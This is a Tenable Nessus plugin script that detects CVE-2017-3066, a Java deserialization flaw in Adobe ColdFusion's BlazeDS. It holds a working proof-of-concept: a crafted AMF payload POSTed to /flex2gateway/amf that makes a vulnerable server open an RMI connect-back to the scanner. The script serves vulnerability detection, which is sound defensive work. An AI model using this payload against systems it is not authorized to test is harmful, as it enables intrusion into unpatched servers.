#TRUSTED 1242ded386c5ed8f3ff4cd8b01f857b39ef20c79a8bd76fc7c12946c24cb0e47fbc4d83716741b625ba458f71ebf54f52835f719eb8392f1d6add138437a4a018362e78906e336b97db1a6d2e2cd85037fee3236a91cb7104dad250b32350472cbd55763856908c818dd7b5424376ebc185e2a5f78528295a6d2702a3fcd040f00568a50f845e93f5e8eb14ac78c7400caf7e8ab807729be26c748cc6ef6e4cf3406909f9ca55f6f1ab6ebe9623e076defbf3a5d7578df317f337a49338c642583dbc41e9a2ad17106a6d1e1c306eda97b170ace0ff13e1e3a751a5ffcf6ab9abe176c3e8c2d472a6a9e08cad4294c4acbaa51e4b6d494c93e778d595f488cf8ea787e0d4f048e139581f4e7bdcba255d1dd7f93abf45a27030b9ae9fa6fbf4d7fd3118c8983e95e16b4f7ca39b3e2c559d244b2bd39aaf7237dca1d7f2295a7eb7ffa85eb4bfb40df2692bd65e8c18dd6f63a9a181a8e6674afdf51f20f6afeedfe1ea4de6a9fad8b17bff3f0ae820550e851ba43027894f4413ebf55ff5deec93a08cb28305c60aca12c8c4d6f00287b2dabc34f40ef4918ec5adebc1e0e389d014419b908e0df59aea488e3b01252d52f77ace7888a761d0ad8ea4dbd64b22a5a0ca279418f3154c7bf1fed75079c13966e7093c3e93f6cfba75de035efba8e5a50a59c2e7f479f3d4621913fcc3a5582c4f64775e6055a2186dbd63c5f40

#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(99731);
  script_version("1.12");
  script_cvs_date("Date: 2019/11/13");

  script_cve_id("CVE-2017-3066");
  script_bugtraq_id(98003);

  script_name(english:"Adobe ColdFusion BlazeDS Java Object Deserialization RCE");
  script_summary(english:"Creates an RMI connect back.");

  script_set_attribute(attribute:"synopsis", value:
"A web-based application running on the remote host is affected by a
remote code execution vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of Adobe ColdFusion running on the remote host is affected
by a Java deserialization flaw in the Apache BlazeDS library when
handling untrusted Java objects. An unauthenticated, remote attacker
can exploit this to execute arbitrary code.");
  script_set_attribute(attribute:"see_also", value:"https://codewhitesec.blogspot.com/2017/04/amf.html");
  script_set_attribute(attribute:"see_also", value:"https://helpx.adobe.com/security/products/coldfusion/apsb17-14.html");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Adobe ColdFusion version 10 update 23 / 11 update 12 / 2016
update 4 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:P/RL:O/RC:C");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2017-3066");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2017/04/25");
  script_set_attribute(attribute:"patch_publication_date", value:"2017/04/25");
  script_set_attribute(attribute:"plugin_publication_date", value:"2017/04/28");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:adobe:coldfusion");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2017-2019 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("coldfusion_detect.nasl");
  script_require_keys("installed_sw/ColdFusion");
  script_require_ports("Services/www", 80, 8500);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("http.inc");
include("misc_func.inc");
include("install_func.inc");

app = 'ColdFusion';
get_install_count(app_name:app, exit_if_zero:TRUE);
port = get_http_port(default:80);
install = get_single_install(app_name:app, port:port);

# create the listening socket the attack will call back to
bind_result = bind_sock_tcp();
if (isnull(bind_result) || len(bind_result) != 2) exit(1, "Failed to create bind socket.");
listening_soc = bind_result[0];
listening_port = bind_result[1];

# connect to the server
soc = open_sock_tcp(port);
if (!soc) audit(AUDIT_SOCK_FAIL, port, app);

# generate the connect back
cb_address = compat::this_host();
amf_payload = '\x00\x03\x00\x00\x00\x01\x00\x00\x00\x00\xff\xff\xff\xff\x11\x0a' +
              '\x07\x33sun.rmi.server.UnicastRef' + mkword(len(cb_address)) + cb_address +
              mkdword(listening_port) +
              '\xf9\x6a\x76\x7b\x7c\xde\x68\x4f\x76\xd8\xaa\x3d\x00\x00\x01\x5b\xb0\x4c\x1d\x81\x80\x01\x00';

# build the request
request = 'POST /flex2gateway/amf HTTP/1.1\r\n' +
          'Host: ' + get_host_ip() + ':' + port + '\r\n' +
          'Content-Type: application/x-amf\r\n' +
          'Content-Length: ' + len(amf_payload) + '\r\n' +
          '\r\n' + amf_payload;

# send the request
send(socket:soc, data:request);
 
# listen for the connect back
cb_soc = sock_accept(socket:listening_soc, timeout:5);
if (!cb_soc)
{
  close(listening_soc);
  close(soc);
  audit(AUDIT_LISTEN_NOT_VULN, app, port);
}

# grab the result 
resp = recv(socket:cb_soc, length:4096);

# close all the sockets
close(cb_soc);
close(listening_soc);
close(soc);

# ensure the connect back is what we expected
if ('JRMI' >!< resp) audit(AUDIT_LISTEN_NOT_VULN, app, port);

report =
  '\nNessus was able to exploit a Java deserialization vulnerability by' +
  '\nsending a crafted Java object.' +
  '\n';
security_report_v4(port:port, severity:SECURITY_HOLE, extra:report);
